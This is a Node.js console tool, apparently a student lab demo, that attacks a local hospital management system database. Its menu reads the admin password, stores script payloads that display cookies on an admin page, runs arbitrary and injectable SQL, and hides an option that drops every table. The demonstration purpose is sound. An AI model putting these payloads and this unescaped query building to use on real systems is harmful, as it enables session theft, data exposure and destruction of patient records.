const newLine = "\n";		// Constant for printing a new line.

/**
 * Main function.
 * Asks user to execute an action.
 */
function main() {
	readUserInput("Press enter to continue: ");

	let action = "0";
	showInitialActions();
	action = readUserInput("Please insert action: ");

	switch (action) {
		case "1":
			showAllTables();
			break;
		case "2":
			showAdminPassword();
			break;
		case "3":
			addXSS();
			break;
		case "4":
			showDataOfATable();
			break;
		case "5":
			createSpecilization();
			break;
		case "6":
			deleteAllDoctorSpecilizations();
			break;
		case "7":
			console.clear();
			main();
			break;
		case "8":
			freeChoiseSQL();
			break;
		case "8aD b0y":
			badBoy();
			break;
		case "9":
			process.exit(0);

		default:
			console.log("Invalid input!", newLine);
			main();
			break;
	}
}

/**
 * Prints the given message and asks the user for an input.
 * The input of the user will be returned.
 * @param {*} msg The message which will be printed.
 */
function readUserInput(msg) {
	const prompt = require('prompt-sync')();
	const input = prompt(msg);
	return input;
}

/**
 * Shows all possible actions.
 * I.e. 1 => Show all tables of the databse.
 */
function showInitialActions() {
	askForInput();
	const actions = [
		"Show all tables of the database.",
		"Show password of admin user.",
		"Add an XSS attack.",
		"Show data of a table.",
		"Add a doctor specilization of your choise.",
		"Delete all doctor specilizations.",
		"Clear console.",
		"Enter sql query of your choice to test your skills.",
		"Exit."
	];

	let index = 1;
	for (let action of actions) {
		console.log(index, "=>", action, newLine);
		index++;
	}
	console.log("8aD b0y", "=>", "Delete all tables of database.", newLine);
}

/**
 * Prints the "ask for input" request.
 */
function askForInput() {
	console.log("Please choose one of the following actions: ", newLine);
}

/**
 * Creates a new connection to the database.
 */
function getDatabaseConnection() {
	const mysql = require('mysql');

	return mysql.createPool({
		host: "localhost",
		user: "root",
		password: "",
		database: "hms"
	});
}

/**
 * Displays all tables of the databse.
 */
function showAllTables() {
	const query = "show tables;";
	executeQuery(query, false);
}

/**
 * Displays the password of the admin user.
 */
function showAdminPassword() {
	const query = "select password from admin";
	executeQuery(query);
}

/**
 * Inserts an XSS atack into the databse.
 * The user will be asked which type of output function he wants to use (alert or console.log).
 * Then he will be asked what he want to put in the output function (message or the cookies).
 * The vulnerable site will open and the user sees the result.
 */
function addXSS() {
	askForInput();
	showXSSOutputOptions();
	const outputFun = readUserInput("Please enter the output function you want to use: ");
	const outputMsg = readUserInput("Please enter the message you want to show or type 'cookie' if you want to see the cookies: ");
	let msg;
	let query;
	switch (outputFun) {
		case "1":
			msg = outputMsg == "cookie" ? "document.cookie" : outputMsg;
			query = `INSERT INTO doctorspecilization (specilization) VALUES ('</td><script>alert(${msg});</script><td>')`;
			executeQuery(query, true);
			break;
		case "2":
			msg = outputMsg == "cookie" ? "document.cookie" : outputMsg;
			query = `INSERT INTO doctorspecilization (specilization) VALUES ('</td><script>console.log(${msg});</script><td>')`;
			executeQuery(query, true);
		break;
		default:
			console.log("Please enter a valid input!", newLine);
			addXSS();
			break;
	}
}

/**
 * Shows the possible output functions to the user.
 */
function showXSSOutputOptions() {
	const options = ["alert", "console.log"];
	let i = 1;
	for (let option of options) {
		console.log(i, "=>", option, newLine);
		i++;
	}
}

/**
 * The user will be asked to insert a table name.
 * All the data of the table will then be diplayed.
 */
function showDataOfATable() {
	console.log("If you can't remember the names of tables enter 'exit' and have a look at them using commend nr. 1!", newLine);
	const tableName = readUserInput("Please enter the name of the table: ");
	if (tableName != "exit") {
		const request = `select * from ${tableName}`;
		executeQuery(request);
	}
	else
		main();
}

/**
 * Asks the user to insert the name of the new doctor specilization and
 * inserts it into the database. The page of doctor specilizations will
 * then open to show the result.
 */
function createSpecilization() {
	console.log("The page of doctor specilizations will open afterwards.", newLine);
	const sp = readUserInput("Enter a new specilization: ");
	const query = `INSERT INTO doctorspecilization (specilization) VALUES ('${sp}')`;
	executeQuery(query, true);
}

/**
 * Deletes all doctor specilizations.
 * The page of doctor specilizations will then open to show the result.
 */
function deleteAllDoctorSpecilizations() {
	console.log("The page of doctor specilizations will open afterwards.", newLine);
	const query = "delete from doctorspecilization;";
	executeQuery(query, true);
}

/**
 * User is free to input a sql query.
 * The query will then be executed and the result will be printed in the console.
 */
function freeChoiseSQL() {
	const query = readUserInput("Enter a query of your choice to test your sql skills: ");
	executeQuery(query);
}

/**
 * Deletes all tables of the database.
 * User will be asked twice to confirm the command.
 */
function badBoy() {
	let sure = readUserInput("Are you sure you want to delete all tables from the database? Y/N: ");
	if (sure == "Y" || sure == "y") {
		sure = readUserInput("Are you really sure you want to delete all tables from the database? Y/N: ");
		if (sure == "Y" || sure == "y") {
			const tableNames = [
				"admin",
  				"appointment",
  				"doctors",
			  	"doctorslog",
  				"doctorspecilization",
  				"tblcontactus",
  				"tblmedicalhistory",
  				"tblpatient",
  				"userlog",
  				"users"
			];
			let query;
			for (let tableName of tableNames) {
				query = `DROP TABLE IF EXISTS ${tableName};`;
				executeQuery(query);
			}
		}
	}
	main();
}

/**
 * Executes the given sql query.
 * If the open flag is set to true the page of doctor specilizations will open.
 * If the open flag is set to false the result of the query will be printed to the console.
 * @param {*} sql The sql query.
 * @param {*} open Flag to open vulnerable site.
 */
function executeQuery(sql, open = false) {
	const con = getDatabaseConnection();
	con.query(sql, function (err, result) {
		if (err) console.log("There went somthing wrong! Please try again!", newLine);
		if (open) {
			var opn = require('opn');
			opn('http://localhost/hospital/hms/admin/doctor-specilization.php');
		}
		else
			console.log(result)
		main();
	});
}

/**
 * Start of the program.
 */
console.log("Welcome to the project of Stephan Unterrainer!", newLine);
main();
